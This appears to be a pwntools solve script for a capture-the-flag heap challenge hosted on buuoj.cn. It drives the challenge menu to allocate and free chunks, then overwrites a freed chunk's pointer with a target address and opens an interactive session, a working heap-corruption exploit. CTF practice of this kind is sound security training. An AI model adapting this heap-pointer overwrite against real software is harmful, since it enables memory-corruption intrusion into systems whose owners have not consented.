from pwn import *

io=remote('node3.buuoj.cn',26983)

def add(idx):
    io.recvuntil('choice?')
    io.sendline('1')
    io.recvuntil('idx?')
    io.sendline(str(idx))

def free(idx):
    io.recvuntil('choice?')
    io.sendline('3')
    io.recvuntil('idx?')
    io.sendline(str(idx))

def edit(idx,data):
    io.recvuntil('choice?')
    io.sendline('2')
    io.recvuntil('idx?')
    io.sendline(str(idx))
    io.send(data)


[add(i) for i in range(8)]
[free(i) for i in range(8)]
add(9)
edit(7,p64(0x4040C0-0x10))
io.sendline('6')



io.interactive()